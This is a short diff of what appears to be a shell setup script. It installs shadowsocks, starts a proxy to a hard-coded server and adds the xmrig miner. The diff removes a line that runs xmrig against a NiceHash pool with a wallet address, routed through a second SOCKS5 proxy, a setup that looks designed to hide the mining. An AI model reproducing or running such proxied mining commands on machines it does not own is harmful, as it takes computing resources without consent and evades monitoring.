@@ -39,5 +39,3 @@ apt -y install shadowsocks-libev rng-tools
 ss-local -s 51.15.84.147 -p 8388 -l 9999 -k 6JPSE -m chacha20-ietf-poly1305 -v &
 
 ph add xmrig
-
-sudo ./xmrig -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380 -a RandomX -u 3J7rYdE9j5tvhms2emkNCLpvJ2fmVcHxri.TEST --threads=3 -x socks5://192.252.211.197:14921
